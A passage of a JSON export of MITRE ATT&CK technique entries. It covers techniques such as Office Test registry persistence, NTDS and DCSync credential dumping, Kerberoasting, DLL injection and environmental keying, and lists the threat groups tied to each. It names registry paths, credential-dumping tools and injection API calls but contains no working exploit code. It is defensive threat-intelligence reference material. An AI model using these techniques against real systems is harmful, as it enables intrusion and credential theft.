point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004) where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.\n\nAn adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002), mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.^[[1]](https://content.fireeye.com/m-trends/rpt-m-trends-2020)^","platforms":["IaaS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1591.001":{"id":"T1591.001","name":"Determine Physical Locations","description":"Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Social Media](https://attack.mitre.org/techniques/T1593/001)).^[[1]](https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/)^^[[2]](https://www.sec.gov/edgar/search-and-access)^ Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Magic Hound"]},"T1137.002":{"id":"T1137.002","name":"Office Test","description":"Adversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.^[[1]](http://www.hexacorn.com/blog/2014/04/16/beyond-good-ol-run-key-part-10/)^^[[2]](https://researchcenter.paloaltonetworks.com/2016/07/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/)^\n\nThere exist user and global Registry keys for the Office Test feature:\n\n* `HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf`\n* `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf`\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.","platforms":["Windows","Office 365"],"tactics":["Persistence"],"campaigns":[],"groups":["APT28"]},"T1587":{"id":"T1587","name":"Develop Capabilities","description":"Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.^[[1]](https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf)^^[[2]](https://securelist.com/sofacy-apt-hits-high-profile-targets-with-updated-toolset/72924/)^^[[3]](https://www.bitdefender.com/files/News/CaseStudies/study/353/Bitdefender-Whitepaper-StrongPity-APT.pdf)^^[[4]](https://blog.talosintelligence.com/2020/06/promethium-extends-with-strongpity3.html)^\n\nAs with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["Kimsuky"]},"T1003.003":{"id":"T1003.003","name":"NTDS","description":"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in `%SystemRoot%\\NTDS\\Ntds.dit` of a domain controller.^[[1]](https://en.wikipedia.org/wiki/Active_Directory)^\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.^[[2]](http://adsecurity.org/?p=1275)^\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":[],"groups":["APT28","Sandworm Team","FIN13","FIN6","Volt Typhoon","menuPass","Chimera","Fox Kitten","Wizard Spider","Dragonfly","Mustang Panda","Ke3chang","HAFNIUM","LAPSUS$","Dragonfly 2.0"]},"T1602.001":{"id":"T1602.001","name":"SNMP (MIB Dump)","description":"Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages^[[1]](https://www.sans.org/reading-room/whitepapers/networkdevs/securing-snmp-net-snmp-snmpv3-1051)^. The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.^[[2]](https://www.us-cert.gov/ncas/alerts/TA18-106A)^^[[3]](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)^ ","platforms":["Network"],"tactics":["Collection"],"campaigns":[],"groups":[]},"T1001.002":{"id":"T1001.002","name":"Steganography","description":"Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control. ","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":["Operation Ghost"],"groups":["Axiom","APT29"]},"T1204.001":{"id":"T1204.001","name":"Malicious Link","description":"An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203). Links may also lead users to download files that require execution via [Malicious File](https://attack.mitre.org/techniques/T1204/002).","platforms":["Linux","macOS","Windows"],"tactics":["Execution"],"campaigns":["Night Dragon","Operation Spalax","Operation Dust Storm","Operation Dream Job","C0021","C0011"],"groups":["FIN7","BlackTech","Mustang Panda","Molerats","Windshift","Kimsuky","LazyScripter","Confucius","FIN8","TA2541","APT29","Patchwork","APT3","Evilnum","TA505","LuminousMoth","Magic Hound","APT39","APT32","Mofang","FIN4","Sandworm Team","Elderwood","Turla","OilRig","EXOTIC LILY","Cobalt Group","ZIRCONIUM","Transparent Tribe","MuddyWater","Wizard Spider","Machete","Sidewinder","APT28","APT33","Leviathan","Ember Bear","Earth Lusca","Lazarus Group","Night Dragon","Dragonfly 2.0"]},"T1550.001":{"id":"T1550.001","name":"Application Access Token","description":"Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users or services and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user or service and are commonly used to access resources in cloud, container-based applications, and software-as-a-service (SaaS).^[[1]](https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/)^ \n\nOAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.^[[2]](https://developer.okta.com/blog/2018/06/20/what-happens-if-your-jwt-is-stolen)^\n\nFor example, with a cloud-based email service, once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.^[[3]](https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens)^ With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.^[[4]](https://staaldraad.github.io/2017/08/02/o356-phishing-with-oauth/)^\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. In AWS and GCP environments, adversaries can trigger a request for a short-lived access token with the privileges of another user account.^[[5]](https://cloud.google.com/iam/docs/creating-short-lived-service-account-credentials)^^[[6]](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_request.html)^ The adversary can then use this token to request data or perform actions the original account could not. If permissions for this feature are misconfigured – for example, by allowing all users to request a token for a particular account - an adversary may be able to gain initial access to a Cloud Account or escalate their privileges.^[[7]](https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration)^\n\nDirect API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords.  For example, in AWS environments, an adversary who compromises a user’s AWS API credentials may be able to use the `sts:GetFederationToken` API call to create a federated user session, which will have the same permissions as the original user but may persist even if the original user credentials are deactivated.^[[8]](https://www.crowdstrike.com/blog/how-adversaries-persist-with-aws-user-federation/)^ Additionally, access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.","platforms":["Office 365","SaaS","Google Workspace","Containers","IaaS","Azure AD"],"tactics":["Defense Evasion","Lateral Movement"],"campaigns":["SolarWinds Compromise"],"groups":["APT28","APT29"]},"T1547.008":{"id":"T1547.008","name":"LSASS Driver","description":"Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.^[[1]](https://technet.microsoft.com/library/cc961760.aspx)^\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1569.002":{"id":"T1569.002","name":"Service Execution","description":"Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (`services.exe`) is an interface to manage and manipulate services.^[[1]](https://docs.microsoft.com/windows/win32/services/service-control-manager)^ The service control manager is accessible to users via GUI components as well as system utilities such as `sc.exe` and [Net](https://attack.mitre.org/software/S0039).\n\n[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.^[[2]](https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx)^ Tools such as [PsExec](https://attack.mitre.org/software/S0029) and `sc.exe` can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.","platforms":["Windows"],"tactics":["Execution"],"campaigns":["Operation Wocao","Operation Honeybee"],"groups":["Chimera","APT39","APT41","Silence","Ke3chang","Blue Mockingbird","APT32","FIN6","APT38","Wizard Spider","Honeybee","Operation Wocao"]},"T1078.004":{"id":"T1078.004","name":"Cloud Accounts","description":"Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud or be hybrid joined between on-premises systems and the cloud through federation with other identity sources such as Windows Active Directory. ^[[1]](https://aws.amazon.com/identity/federation/)^^[[2]](https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction)^^[[3]](https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs)^\n\nService or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments.\n\nAn adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. \n","platforms":["Azure AD","Office 365","SaaS","IaaS","Google Workspace"],"tactics":["Defense Evasion","Persistence","Privilege Escalation","Initial Access"],"campaigns":["SolarWinds Compromise","C0027"],"groups":["APT29","APT28","APT33","LAPSUS$","Ke3chang"]},"T1480.001":{"id":"T1480.001","name":"Environmental Keying","description":"Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.^[[1]](https://www.schneier.com/academic/paperfiles/paper-clueless-agents.pdf)^\n\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.^[[2]](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf)^^[[3]](https://www.proofpoint.com/us/threat-insight/post/home-routers-under-attack-malvertising-windows-android-devices)^^[[4]](https://pdfs.semanticscholar.org/2721/3d206bc3c1e8c229fb4820b6af09e7f975da.pdf)^^[[5]](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/)^^[[6]](https://github.com/Genetic-Malware/Ebowla/blob/master/Eko_2016_Morrow_Pitts_Master.pdf)^ By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.^[[2]](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf)^^[[6]](https://github.com/Genetic-Malware/Ebowla/blob/master/Eko_2016_Morrow_Pitts_Master.pdf)^ These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).\n\nSimilar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.^[[2]](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf)^^[[4]](https://pdfs.semanticscholar.org/2721/3d206bc3c1e8c229fb4820b6af09e7f975da.pdf)^^[[5]](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/smuggling-hta-files-in-internet-exploreredge/)^^[[6]](https://github.com/Genetic-Malware/Ebowla/blob/master/Eko_2016_Morrow_Pitts_Master.pdf)^^[[7]](https://github.com/nccgroup/demiguise/blob/master/examples/virginkey.js)^ By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.^[[2]](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/20134940/kaspersky-lab-gauss.pdf)^ This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.\n\nLike other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Equation","APT41"]},"T1008":{"id":"T1008","name":"Fallback Channels","description":"Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.","platforms":["Linux","Windows","macOS"],"tactics":["Command and Control"],"campaigns":["Night Dragon"],"groups":["OilRig","APT41","Lazarus Group","FIN7","Carbanak"]},"T1564.004":{"id":"T1564.004","name":"NTFS File Attributes","description":"Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. ^[[1]](https://posts.specterops.io/host-based-threat-modeling-indicator-design-a9dbbb53d5ea)^ Within MFT entries are file attributes, ^[[2]](https://blogs.technet.microsoft.com/askcore/2010/08/25/ntfs-file-attributes/)^ such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). ^[[1]](https://posts.specterops.io/host-based-threat-modeling-indicator-design-a9dbbb53d5ea)^ ^[[3]](http://msdn.microsoft.com/en-us/library/aa364404)^ ^[[4]](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/)^ ^[[5]](https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/)^\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. ^[[6]](http://journeyintoir.blogspot.com/2012/12/extracting-zeroaccess-from-ntfs.html)^ ^[[4]](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["APT32"]},"T1558.003":{"id":"T1558.003","name":"Kerberoasting","description":"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).^[[1]](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)^^[[2]](https://adsecurity.org/?p=2293)^ \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service^[[3]](https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/)^).^[[4]](https://msdn.microsoft.com/library/ms677949.aspx)^^[[5]](https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx)^^[[6]](https://redsiege.com/kerberoast-slides)^^[[7]](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)^\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).^[[1]](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)^^[[2]](https://adsecurity.org/?p=2293)^ Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.^[[2]](https://adsecurity.org/?p=2293)^^[[1]](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)^ ^[[7]](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)^\n\nThis same behavior could be executed using service tickets captured from network traffic.^[[2]](https://adsecurity.org/?p=2293)^\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).^[[6]](https://redsiege.com/kerberoast-slides)^","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":["Operation Wocao","SolarWinds Compromise"],"groups":["Wizard Spider","FIN7","APT29","UNC2452","Operation Wocao"]},"T1003.006":{"id":"T1003.006","name":"DCSync","description":"Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)^[[1]](https://msdn.microsoft.com/library/cc228086.aspx)^ ^[[2]](https://msdn.microsoft.com/library/dd207691.aspx)^ ^[[3]](https://wiki.samba.org/index.php/DRSUAPI)^ ^[[4]](https://source.winehq.org/WineAPI/samlib.html)^ to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data^[[5]](https://adsecurity.org/?p=1729)^ from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)^[[6]](http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/)^ or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).^[[7]](https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM)^\n\nDCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).^[[8]](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)^ Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.^[[9]](https://msdn.microsoft.com/library/cc237008.aspx)^","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":["C0027","Operation Wocao","SolarWinds Compromise"],"groups":["Earth Lusca","LAPSUS$","APT29","UNC2452","Operation Wocao"]},"T1124":{"id":"T1124","name":"System Time Discovery","description":"An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. ^[[1]](https://msdn.microsoft.com/ms724961.aspx)^^[[2]](https://technet.microsoft.com/windows-server-docs/identity/ad-ds/get-started/windows-time-service/windows-time-service-tools-and-settings)^\n\nSystem time information may be gathered in a number of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows by performing `net time \\\\hostname` to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using `w32tm /tz`.^[[2]](https://technet.microsoft.com/windows-server-docs/identity/ad-ds/get-started/windows-time-service/windows-time-service-tools-and-settings)^\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show clock detail` can be used to see the current time configuration.^[[3]](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/security/s1/sec-s1-cr-book/sec-cr-s2.html#wp1896741674)^\n\nThis information could be useful for performing other techniques, such as executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)^[[4]](https://www.rsaconference.com/writable/presentations/file_upload/ht-209_rivner_schwartz.pdf)^, or to discover locality information based on time zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.^[[5]](https://any.run/cybersecurity-blog/time-bombs-malware-with-delayed-execution/)^","platforms":["Windows","Network"],"tactics":["Discovery"],"campaigns":["Operation CuckooBees","Operation Wocao","C0015"],"groups":["Sidewinder","Higaisa","ZIRCONIUM","BRONZE BUTLER","Turla","Darkhotel","Chimera","Lazarus Group","The White Company","Operation Wocao"]},"T1053.002":{"id":"T1053.002","name":"At","description":"Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group.\n\nOn Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the `at.allow` file. If the `at.allow` file does not exist, the `at.deny` file is checked. Every username not listed in `at.deny` is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the `at.deny` exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).^[[1]](https://man7.org/linux/man-pages/man1/at.1p.html)^\n\nAdversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).\n\nIn Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via `sudo`.^[[2]](https://gtfobins.github.io/gtfobins/at/)^","platforms":["Windows","Linux","macOS"],"tactics":["Execution","Persistence","Privilege Escalation"],"campaigns":[],"groups":["Threat Group-3390","APT18","BRONZE BUTLER"]},"T1055.001":{"id":"T1055.001","name":"Dynamic-link Library Injection","description":"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as `VirtualAllocEx` and `WriteProcessMemory`, then invoked with `CreateRemoteThread` (which calls the `LoadLibrary` API responsible for loading the DLL). ^[[1]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)^ \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of `LoadLibrary`).^[[2]](https://www.endgame.com/blog/technical-blog/hunting-memory)^^[[1]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)^ \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's `AddressOfEntryPoint` before starting a new thread in the target process.^[[3]](https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection)^ This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.^[[4]](https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/)^ \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":["C0015"],"groups":["Turla","BackdoorDiplomacy","Leviathan","Putter Panda","Lazarus Group","Tropic Trooper","TA505","Wizard Spider"]},"T1588.005":{"id":"T1588.005","name":"Exploits","description":"Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.^[[1]](https://www.exploit-db.com/)^^[[2]](https://www.wired.co.uk/article/darkhotel-hacking-team-cyber-espionage)^^[[3]](https://www.nytimes.com/2013/07/14/world/europe/nations-buying-as-hackers-sell-computer-flaws.html)^\n\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.^[[4]](https://citizenlab.ca/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/)^^[[5]](https://www.vice.com/en/article/3kx5y3/uzbekistan-hacking-operations-uncovered-due-to-spectacularly-bad-opsec)^ In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).^[[2]](https://www.wired.co.uk/article/darkhotel-hacking-team-cyber-espionage)^\n\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote 